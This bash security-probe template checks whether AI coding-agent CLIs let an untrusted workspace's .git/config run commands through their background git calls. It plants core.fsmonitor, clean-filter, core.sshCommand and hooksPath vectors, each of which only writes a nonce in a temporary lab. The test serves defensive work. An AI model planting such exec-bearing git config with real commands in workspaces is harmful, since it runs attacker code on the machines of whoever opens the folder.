#!/usr/bin/env bash
# @id: coding-agent-git-config-exec
# @name: Coding-agent CLI lets an untrusted workspace's own .git/config execute code through its background git calls (GitSpawn)
# @author: CERT-X-GEN Security Team
# @description: Assembles a workspace directory (as FILES, never via git clone) whose own .git/config carries the four ways git runs a repo-chosen program on ordinary read operations - core.fsmonitor (any index refresh: git status, git diff), a clean/smudge filter (git diff on an attributed file), core.sshCommand (git ls-remote against an ssh remote), and core.hooksPath - each pointing at a benign command that writes its own nonce into this template's lab. A host-git positive control first proves which of those vectors this machine's git actually executes; a benign repo then proves the target shells out to git for context at all. The target is then pointed at the malicious workspace with a hermetic HOME and a logging git shim. CONFIRMED when a live vector's nonce appears: the target's unattended, startup context-gathering git call made git run an attacker-chosen command out of a directory nobody approved - before any workspace-trust prompt, before auth, outside any sandbox. This is not the agent's own config format (coding-agent-repo-config-autoexec covers that); the executor here is git itself.
# @severity: high
# @tags: ai, coding-agent, cli, untrusted-workspace, git, git-config, fsmonitor, hookspath, sshcommand, gitspawn, trust-boundary, autoexec, cwe-94, cwe-1188, cwe-829
# @cwe: CWE-94
# @confidence: 90
# @target_kinds: cli
# @oracles: property
# @references: https://thehackernews.com/2026/09/gitspawn-git-config-agent-rce.html
#
# THE CLASS  --  "GitSpawn"
#
# A coding agent, the moment it opens a workspace, shells out to git to build
# context: `git status`, `git diff`, `git rev-parse`, `git log`. It does this
# unattended, at startup, before it has shown a workspace-trust prompt, before it
# authenticates anything, and - because it is only "reading" - usually outside
# whatever sandbox guards the code it will later run.
#
# But `git status` is not a read. git executes REPO-CONTROLLED configuration on
# ordinary index operations:
#
#   core.fsmonitor    a command git runs on EVERY index refresh - status, diff,
#                     add. The headline GitSpawn vector.
#   filter.<n>.clean  a command git runs to normalise a tracked file, triggered
#                     by git diff / git status on a path .gitattributes assigns
#                     the filter to.
#   core.sshCommand   the program git runs for the SSH transport, invoked by
#                     git ls-remote / git fetch against an ssh:// remote.
#   core.hooksPath    a directory of hooks git runs on hook-bearing operations.
#
# All four live in the workspace's own `.git/config`. The critical delivery
# constraint that makes this a distinct class: a `git clone` does NOT carry the
# source repository's local config, so a cloned repo is safe. The `.git`
# directory has to ARRIVE AS FILES - a directory the attacker assembled and
# shipped by zip, sync, or USB, or a pull-request branch checked out into a
# prepared tree. Whoever assembled that directory chooses what runs on the
# machine of whoever opens it.
#
#   input      a workspace directory whose .git/config sets core.fsmonitor,
#              a clean filter, core.sshCommand and core.hooksPath, each to a
#              benign `printf <nonce> > <lab file>`. Built by `git init` plus
#              config injection - i.e. assembled as files, never cloned.
#   observable after the target opens that directory and gathers context, a
#              nonce that only a git-executed command could have written exists
#              in this template's lab.
#   oracle     property -- a canary/nonce post-condition, gated by a host-git
#              positive control (which vectors this machine's git actually runs)
#              and a benign-repo feature control (does the target shell out to
#              git for context at all).
#
# WHY THE TWO CONTROLS MATTER
#
# The host-git control runs raw git over an identical malicious workspace and
# records which vectors THIS machine's git executes - core.fsmonitor support in
# particular is version- and build-dependent. A vector the host does not run is
# excluded, and if the host runs none of them the honest verdict is `skipped`,
# not a false all-clear. The benign-repo control opens a clean git repository
# and checks whether the target shells out to git at all: a tool that runs no
# git has nothing for this class to bite, and must be `skipped` - distinct from
# a tool that DOES run git for context but refused or sanitised THIS workspace,
# which is the refutation worth having.
#
# NOT THE SAME CHECK AS ITS NEIGHBOURS
#
# `coding-agent-repo-config-autoexec` plants six AGENT-OWNED surfaces - a
# .claude hook, .mcp.json autoApprove, a folderOpen task, an AGENTS.md directive
# - and the executor is the agent. Here the surface is `.git/config` and the
# executor is GIT: the agent need only run `git status`, a call it makes about
# nothing the user asked for. A tool can pass that check (it prompts before
# honouring its own config format) and fail this one, because it never routed
# its background git through the same trust gate.
#
# SAFETY
#
# Everything is written inside a `mktemp -d` lab removed on exit; $HOME is
# redirected into that lab for every target run, so no real configuration is
# read or written, and the malicious workspaces are private throwaways. Every
# planted "attack" is `printf <random-nonce> > <lab file>`. No CVE is reproduced
# against any real product; the class is named in the playbook, not weaponised.
set -uo pipefail

# ---------------------------------------------------------------------------
# Probe contract. CERT_X_GEN_TARGET_KIND is not set by every shipping engine
# build, which passes only the scope string in CERT_X_GEN_TARGET_HOST
# (`cli:///path/to/binary`). Derive the kind and the binary path from that
# string when the explicit variables are absent, so one template runs under both
# and under a developer invoking it by hand.
# ---------------------------------------------------------------------------
CXG_RAW="${CERT_X_GEN_TARGET_HOST:-}"
CXG_KIND="${CERT_X_GEN_TARGET_KIND:-}"
CXG_INSTR="${CERT_X_GEN_TARGET_INSTRUMENTATION:-unknown}"

CXG_BIN="$CXG_RAW"
case "$CXG_RAW" in
    cli://*)
        [ -n "$CXG_KIND" ] || CXG_KIND="cli"
        CXG_BIN="${CXG_RAW#cli://}"
        ;;
    *)
        if [ -z "$CXG_KIND" ] && [ -n "$CXG_RAW" ] && [ -f "$CXG_RAW" ] && [ -x "$CXG_RAW" ]; then
            CXG_KIND="cli"
        fi
        ;;
esac
CXG_TIMEOUT="${CXG_AGENT_TIMEOUT:-15}"
CXG_PROBES_DELIVERED=0
CXG_PROBE_BUDGET="${CXG_AGENT_PROBE_BUDGET:-24}"

# ---------------------------------------------------------------------------
# JSON contract. Built with json.dumps, never by interpolation.
# ---------------------------------------------------------------------------
cxg_emit() {
    CXG_F="${3:-[]}" CXG_S="$1" CXG_D="$2" CXG_I="$CXG_INSTR" python3 -c '
import json, os
detail = os.environ["CXG_D"]
try:
    findings = json.loads(os.environ["CXG_F"])
except ValueError as exc:
    findings = []
    detail += " (finding-json-invalid: %s)" % exc
print(json.dumps({"findings": findings,
                  "metadata": {"status": os.environ["CXG_S"],
                               "detail": detail,
                               "instrumentation": os.environ["CXG_I"]}}))'
}

# Every verdict exits 0 and carries its status in the JSON: the shipped engine
# discards a shell template's findings when it exits non-zero.
cxg_confirm() { cxg_emit confirmed "$1" "$2"; exit 0; }
cxg_error()   { cxg_emit errored   "$1"; exit 0; }
cxg_skip()    { cxg_emit skipped   "$1"; exit 0; }

cxg_refute() {
    if [ "$CXG_PROBES_DELIVERED" -eq 0 ]; then
        cxg_emit skipped "no-probe-delivered (nothing reached the target, so a refutation would be unearned): $1"
        exit 0
    fi
    cxg_emit refuted "$1 probes=$CXG_PROBES_DELIVERED"
    exit 0
}

cxg_finding() {
    CXG_SEV="$1" CXG_CONF="$2" CXG_TITLE="$3" CXG_DESC="$4" CXG_CWE="$5" \
    CXG_REQ="$6" CXG_RESP="$7" CXG_PAT="$8" CXG_DATA="${9:-{\}}" python3 -c '
import json, os

def visible(s):
    return "".join(c if (31 < ord(c) < 127 or c in "\n\t") else "\\x%02x" % ord(c)
                   for c in s)

try:
    data = json.loads(os.environ["CXG_DATA"])
except ValueError:
    data = {"note": "data-json-invalid"}
print(json.dumps([{
    "severity":    os.environ["CXG_SEV"],
    "confidence":  int(os.environ["CXG_CONF"]),
    "title":       os.environ["CXG_TITLE"],
    "description": os.environ["CXG_DESC"],
    "cwe_ids":     [c.strip() for c in os.environ["CXG_CWE"].split(",") if c.strip()],
    "evidence": {
        "request":          os.environ["CXG_REQ"],
        "response":         visible(os.environ["CXG_RESP"][:1600]),
        "matched_patterns": [p.strip() for p in os.environ["CXG_PAT"].split(",") if p.strip()],
        "data":             data,
    },
}]))'
}

cxg_timeout() {
    secs="$1"; shift
    if command -v timeout >/dev/null 2>&1; then timeout "$secs" "$@"; return $?; fi
    if command -v gtimeout >/dev/null 2>&1; then gtimeout "$secs" "$@"; return $?; fi
    "$@" & child=$!
    ( sleep "$secs"; kill -TERM "$child" 2>/dev/null; sleep 1
      kill -KILL "$child" 2>/dev/null ) >/dev/null 2>&1 & watchdog=$!
    rc=0; wait "$child" 2>/dev/null || rc=$?
    kill "$watchdog" 2>/dev/null; wait "$watchdog" 2>/dev/null || true
    [ "$rc" -eq 143 ] && rc=124
    return "$rc"
}

# ---------------------------------------------------------------------------
# Guards and lab.
# ---------------------------------------------------------------------------
[ "$CXG_KIND" = "cli" ] || cxg_skip "not-a-cli-target(kind=${CXG_KIND:-none})"
[ -n "$CXG_BIN" ]       || cxg_error "no-target-path"
[ -x "$CXG_BIN" ]       || cxg_error "target-not-executable($CXG_BIN)"
command -v python3 >/dev/null 2>&1 || cxg_error "python3-required-to-build-probe"
REAL_GIT="$(command -v git 2>/dev/null)"
[ -n "$REAL_GIT" ] && [ -x "$REAL_GIT" ] || cxg_skip "git-not-on-path (the whole class is 'the agent shells out to git'; without git there is nothing to test)"

LAB="$(mktemp -d "${TMPDIR:-/tmp}/cxg-gitspawn.XXXXXX")" || cxg_error "lab-setup-failed"
# shellcheck disable=SC2064
trap "chmod -R u+rwX '$LAB' 2>/dev/null; rm -rf '$LAB'" EXIT
CANARIES="$LAB/canaries"; mkdir -p "$CANARIES" || cxg_error "lab-layout-failed"

HELP_TEXT=""
for probe in --help help -h; do
    HELP_TEXT="$(cxg_timeout "$CXG_TIMEOUT" "$CXG_BIN" "$probe" 2>&1)"
    printf '%s' "$HELP_TEXT" | grep -qiE 'usage|commands?:|options?:' && break
    HELP_TEXT=""
done
[ -n "$HELP_TEXT" ] || HELP_TEXT="$(cxg_timeout "$CXG_TIMEOUT" "$CXG_BIN" 2>&1)"
[ -n "$HELP_TEXT" ] || cxg_error "target-produced-no-output-at-all"

salt() { od -An -N8 -tx1 /dev/urandom | tr -d ' \n'; }

# ---------------------------------------------------------------------------
# Assemble a malicious workspace AS FILES (git init + config injection). This is
# deliberately not a clone: a clone would not carry the attacker's local config,
# which is the whole point of the class. All build-time git runs happen BEFORE
# the exec-bearing keys are injected, so no vector fires during construction.
#
# `prefix` (ctl|prb) selects the canary set and nonce salt, so a control run
# (raw git) and a probe run (the target) never read each other's nonces.
# Emits `<arm>\t<nonce>\t<canary path>` per line.
# ---------------------------------------------------------------------------
build_malicious_ws() {
    ws="$1"; prefix="$2"; s="$3"
    mkdir -p "$ws" || return 1
    chmod 0700 "$ws"
    (
        cd "$ws" || exit 1
        "$REAL_GIT" init -q .
        "$REAL_GIT" config user.email probe@cert-x-gen.invalid
        "$REAL_GIT" config user.name  'CERT-X-GEN probe'
        printf 'context payload\n' > tracked.txt
        printf 'tracked.txt filter=ctxfilter\n' > .gitattributes
        "$REAL_GIT" add tracked.txt .gitattributes
        "$REAL_GIT" commit -q -m 'workspace as delivered'
        # Working-tree edit so `git status`/`git diff` have real work to do
        # (and so the clean filter is actually invoked on a changed path).
        printf 'local edit\n' >> tracked.txt
    ) >/dev/null 2>&1 || return 1

    fsmon_can="$CANARIES/$prefix.fsmonitor.txt"
    filt_can="$CANARIES/$prefix.filter.txt"
    ssh_can="$CANARIES/$prefix.sshcommand.txt"
    hook_can="$CANARIES/$prefix.hookspath.txt"
    fsmon_n="CXG-GITSPAWN-FSMONITOR-${prefix}-${s}"
    filt_n="CXG-GITSPAWN-FILTER-${prefix}-${s}"
    ssh_n="CXG-GITSPAWN-SSHCOMMAND-${prefix}-${s}"
    hook_n="CXG-GITSPAWN-HOOKSPATH-${prefix}-${s}"

    (
        cd "$ws" || exit 1
        # core.fsmonitor: run on every index refresh (status/diff/add).
        "$REAL_GIT" config core.fsmonitor "printf %s '$fsmon_n' > '$fsmon_can'; true"
        # clean/smudge filter: run when git normalises the attributed file.
        "$REAL_GIT" config filter.ctxfilter.clean  "printf %s '$filt_n' > '$filt_can'; cat"
        "$REAL_GIT" config filter.ctxfilter.smudge "cat"
        # core.sshCommand: run for the ssh transport (ls-remote/fetch).
        "$REAL_GIT" config core.sshCommand "printf %s '$ssh_n' > '$ssh_can'; false"
        "$REAL_GIT" remote add origin "ssh://git@gitspawn.invalid/repo.git"
        # core.hooksPath: a hook git runs on hook-bearing operations.
        mkdir -p .githooks
        printf '#!/bin/sh\nprintf %%s %s > %s\n' "'$hook_n'" "'$hook_can'" > .githooks/pre-commit
        chmod +x .githooks/pre-commit
        "$REAL_GIT" config core.hooksPath .githooks
    ) >/dev/null 2>&1 || return 1

    printf 'fsmonitor\t%s\t%s\n'  "$fsmon_n" "$fsmon_can"
    printf 'filter\t%s\t%s\n'     "$filt_n"  "$filt_can"
    printf 'sshcommand\t%s\t%s\n' "$ssh_n"   "$ssh_can"
    printf 'hookspath\t%s\t%s\n'  "$hook_n"  "$hook_can"
}

# A clean git repository with no exec-bearing config: used only to detect
# whether the target shells out to git for context at all.
build_benign_ws() {
    ws="$1"
    mkdir -p "$ws" || return 1
    chmod 0700 "$ws"
    (
        cd "$ws" || exit 1
        "$REAL_GIT" init -q .
        "$REAL_GIT" config user.email probe@cert-x-gen.invalid
        "$REAL_GIT" config user.name  'CERT-X-GEN probe'
        printf 'hello\n' > README.md
        "$REAL_GIT" add README.md
        "$REAL_GIT" commit -q -m 'benign'
        "$REAL_GIT" remote add origin "ssh://git@example.invalid/benign.git"
        printf 'edit\n' >> README.md
    ) >/dev/null 2>&1 || return 1
    return 0
}

CTL_WS="$LAB/ws/control"
BENIGN_WS="$LAB/ws/benign"
PRB_WS="$LAB/ws/probe"
mkdir -p "$LAB/ws" || cxg_error "lab-layout-failed"

CTL_SALT="$(salt)"; PRB_SALT="$(salt)"
build_malicious_ws "$CTL_WS" ctl "$CTL_SALT" >"$LAB/ctl.tsv" || cxg_error "could-not-build-control-workspace"
build_malicious_ws "$PRB_WS" prb "$PRB_SALT" >"$LAB/prb.tsv" || cxg_error "could-not-build-probe-workspace"
build_benign_ws "$BENIGN_WS"                                  || cxg_error "could-not-build-benign-workspace"

# A logging git shim: forwards to the real git and records that the target ran
# git (and with what argv, so a sanitised call is visible in the evidence).
SHIM="$LAB/shim"; mkdir -p "$SHIM" || cxg_error "lab-layout-failed"
GITLOG="$LAB/gitcalls.log"
cat >"$SHIM/git" <<SHIMEOF
#!/bin/sh
printf '%s\n' "\$*" >> '$GITLOG'
exec '$REAL_GIT' "\$@"
SHIMEOF
chmod +x "$SHIM/git" || cxg_error "could-not-install-git-shim"

# ---------------------------------------------------------------------------
# Host-git positive control. Run RAW git over the control workspace and record
# which vectors THIS machine's git actually executes. A refutation must not be a
# silently-broken arm, and a vector the host cannot run must not be counted
# against the target.
# ---------------------------------------------------------------------------
rm -f "$CANARIES/ctl."* 2>/dev/null
"$REAL_GIT" -C "$CTL_WS" status --porcelain >/dev/null 2>&1 || true
"$REAL_GIT" -C "$CTL_WS" diff --stat        >/dev/null 2>&1 || true
"$REAL_GIT" -C "$CTL_WS" ls-remote origin   >/dev/null 2>&1 || true
"$REAL_GIT" -C "$CTL_WS" commit --allow-empty -m ctl >/dev/null 2>&1 || true

LIVE=""     # arms this host's git executes, one per line
while IFS="$(printf '\t')" read -r arm nonce canary; do
    [ -n "$arm" ] || continue
    if [ -f "$canary" ] && grep -qF "$nonce" "$canary" 2>/dev/null; then
        LIVE="$LIVE$arm
"
    fi
done <"$LAB/ctl.tsv"
LIVE="$(printf '%s' "$LIVE" | grep -v '^$')"
LIVE_SUMMARY="$(printf '%s' "$LIVE" | paste -sd, - 2>/dev/null)"

[ -n "$LIVE" ] || cxg_skip "host-git-executes-no-planted-vector (this machine's git ran none of core.fsmonitor, a clean filter, core.sshCommand or core.hooksPath over an identical malicious workspace; the mechanism is unavailable here, so any refutation would be unearned. git=$($REAL_GIT --version 2>/dev/null))"

# ---------------------------------------------------------------------------
# Candidate subcommands: the ones that open a workspace or gather context, where
# an agent's background git runs. Parsed from --help, same shape as the family.
# ---------------------------------------------------------------------------
SUBS="$(printf '%s' "$HELP_TEXT" | python3 -c '
import re, sys
NAME = re.compile(r"^[ \t]{1,8}([a-z][a-z0-9][a-z0-9_.-]*)\b(.*)$")
SEP = re.compile(r"(?:[ ]{2,}|\t)\S")
NOT_A_COMMAND = {"usage", "options", "option", "commands", "command",
                 "arguments", "args", "flags", "environment", "examples",
                 "example", "see", "note", "notes", "where", "for", "the"}
seen, out = set(), []
for line in sys.stdin.read().splitlines():
    m = NAME.match(line)
    if not m:
        continue
    name, rest = m.group(1), m.group(2)
    if not SEP.search(rest) or name in seen or name in NOT_A_COMMAND:
        continue
    seen.add(name)
    out.append(name)
print("\n".join(out))' | grep -E '^(open|session|context|start|chat|ask|run|agent|status|scan|index|analyze|analyse|review|inspect|init|load)$' | head -8)"
SUBS="$(printf '%s\n%s\n' "$SUBS" "" | grep -v '^$')"

# ---------------------------------------------------------------------------
# Run the target in a workspace and report whether it ran git and which LIVE
# vectors fired for it.
# ---------------------------------------------------------------------------
LAST_OUT=""; LAST_RC=0; TARGET_RAN_GIT=0; FIRED=""; FIRED_SUMMARY=""

run_target() {
    ws="$1"; prefix="$2"; sub="$3"
    rm -f "$CANARIES/$prefix."* 2>/dev/null
    : > "$GITLOG"
    if [ -n "$sub" ]; then
        LAST_OUT="$(cd "$ws" && HOME="$LAB/home" XDG_CONFIG_HOME="$LAB/home/.config" \
            PATH="$SHIM:$PATH" cxg_timeout "$CXG_TIMEOUT" "$CXG_BIN" "$sub" 2>&1)"
    else
        LAST_OUT="$(cd "$ws" && HOME="$LAB/home" XDG_CONFIG_HOME="$LAB/home/.config" \
            PATH="$SHIM:$PATH" cxg_timeout "$CXG_TIMEOUT" "$CXG_BIN" 2>&1)"
    fi
    LAST_RC=$?
    CXG_PROBES_DELIVERED=$((CXG_PROBES_DELIVERED + 1))
    [ -s "$GITLOG" ] && TARGET_RAN_GIT=1 || TARGET_RAN_GIT=0

    FIRED=""
    while IFS="$(printf '\t')" read -r arm nonce canary; do
        [ -n "$arm" ] || continue
        printf '%s\n' "$LIVE" | grep -qx "$arm" || continue   # only count live vectors
        if [ -f "$canary" ] && grep -qF "$nonce" "$canary" 2>/dev/null; then
            FIRED="$FIRED$arm
"
        fi
    done <"$LAB/$prefix.tsv"
    FIRED="$(printf '%s' "$FIRED" | grep -v '^$')"
    FIRED_SUMMARY="$(printf '%s' "$FIRED" | paste -sd, - 2>/dev/null)"
    [ -n "$FIRED" ]
}

# ---------------------------------------------------------------------------
# Phase 1 -- feature control. In a CLEAN git repository, which subcommand makes
# the target shell out to git for context? Without one, the target reads no git
# at startup and there is nothing for this class to reach: `skipped`, not a
# refutation.
# ---------------------------------------------------------------------------
CONTEXT_SUB=""; FEATURE_FOUND=0; TRIED=0
while IFS= read -r SUB; do
    [ "$CXG_PROBES_DELIVERED" -lt "$CXG_PROBE_BUDGET" ] || break
    TRIED=$((TRIED + 1))
    run_target "$BENIGN_WS" "benign-unused" "$SUB" >/dev/null 2>&1 || true
    if [ "$TARGET_RAN_GIT" -eq 1 ]; then
        CONTEXT_SUB="$SUB"; FEATURE_FOUND=1; break
    fi
done <<OUTER
$SUBS

OUTER

[ "$FEATURE_FOUND" -eq 1 ] || cxg_skip "no-git-context-surface (tried $TRIED subcommand(s) within a $CXG_PROBE_BUDGET-probe budget; opened in a clean git repository, the target shelled out to git for none of them. It gathers no git-backed repository context at startup, so an untrusted .git/config has nothing to drive - there is no surface whose trust boundary to test. host-live vectors were: $LIVE_SUMMARY)"

# ---------------------------------------------------------------------------
# Phase 2 -- the probe. The same subcommand, now pointed at the malicious
# workspace whose .git/config carries the four vectors. The only thing that
# changed is that opening this directory lets a stranger's git config drive the
# git the agent runs.
# ---------------------------------------------------------------------------
if run_target "$PRB_WS" prb "$CONTEXT_SUB"; then
    WITNESS_ARM="$(printf '%s' "$FIRED" | head -1)"
    WITNESS_NONCE="$(awk -F'\t' -v a="$WITNESS_ARM" '$1 == a { print $2; exit }' "$LAB/prb.tsv")"
    SANITISER="$(grep -oE 'core\.(fsmonitor|hooksPath|sshCommand)=' "$GITLOG" 2>/dev/null | sort -u | paste -sd' ' - 2>/dev/null)"

    FINDINGS="$(cxg_finding \
        high 92 \
        "Coding-agent CLI lets an untrusted workspace's .git/config execute code via its background git calls (GitSpawn)" \
        "Opened in a workspace directory this template ASSEMBLED AS FILES - never cloned, because a clone would not carry the attacker's local git config - and pointed at subcommand '$CONTEXT_SUB', the target's unattended context-gathering ran git against a directory nobody approved, and git executed the command that workspace's own .git/config declared. Live vector(s) that fired for the target: $FIRED_SUMMARY (of the vector(s) this host's git executes at all: $LIVE_SUMMARY). Each fired vector wrote a nonce that only a git-executed command could have produced - e.g. core.fsmonitor runs on every index refresh, so a bare 'git status' at startup is enough. This happens before any workspace-trust prompt, before authentication, and outside any sandbox the agent applies to code it later runs, which is why the severity is high: whoever assembled the .git directory (a zipped repo, a synced folder, a prepared pull-request tree) chose what runs on the machine of whoever opened it. Remediate by routing every background git invocation through a hardened form - 'git -c core.fsmonitor= -c core.hooksPath= -c core.sshCommand= ...', an isolated GIT_CONFIG environment, or a refusal to run git in a workspace whose .git/config carries exec-bearing directives until the operator approves the path." \
        "CWE-94,CWE-1188,CWE-829" \
        "cd <workspace assembled as files, malicious .git/config> && $(basename "$CXG_BIN") ${CONTEXT_SUB:-<bare>}   # git shim + hermetic \$HOME" \
        "$LAST_OUT" \
        "${WITNESS_NONCE:-$PRB_SALT}" \
        "{\"oracle\":\"property\",\"post_condition\":\"a git-executed nonce from the workspace's own .git/config exists after the target gathered context\",\"vectors_fired_for_target\":\"$FIRED_SUMMARY\",\"vectors_live_on_host\":\"$LIVE_SUMMARY\",\"context_subcommand\":\"$CONTEXT_SUB\",\"target_ran_git\":true,\"delivery\":\"assembled-as-files-not-cloned\",\"trust_prompt\":\"none-before-first-git\",\"sanitiser_flags_observed\":\"${SANITISER:-none}\",\"host_git\":\"$($REAL_GIT --version 2>/dev/null)\",\"target_exit_code\":$LAST_RC}")"

    cxg_confirm "oracle=property(gitspawn .git/config executed via background git; sub=${CONTEXT_SUB:-<bare>} fired=$FIRED_SUMMARY host-live=$LIVE_SUMMARY) exit=$LAST_RC" "$FINDINGS"
fi

# Target ran git for context (Phase 1 proved it) but no live vector fired in the
# malicious workspace: it sanitised its git calls or refused the directory.
SANITISER="$(grep -oE 'core\.(fsmonitor|hooksPath|sshCommand)=' "$GITLOG" 2>/dev/null | sort -u | paste -sd' ' - 2>/dev/null)"
if [ "$TARGET_RAN_GIT" -eq 1 ]; then
    cxg_refute "target shells out to git for context (subcommand '$CONTEXT_SUB', proven against a clean repo) but none of the host-live vectors ($LIVE_SUMMARY) fired when the workspace's own .git/config declared them${SANITISER:+; observed hardening flags: $SANITISER} -- its background git is gated against an untrusted workspace"
fi
cxg_refute "target ran the context subcommand '$CONTEXT_SUB' but issued no git in the malicious workspace, though it did in a clean one; no live vector ($LIVE_SUMMARY) fired -- treated as gated"
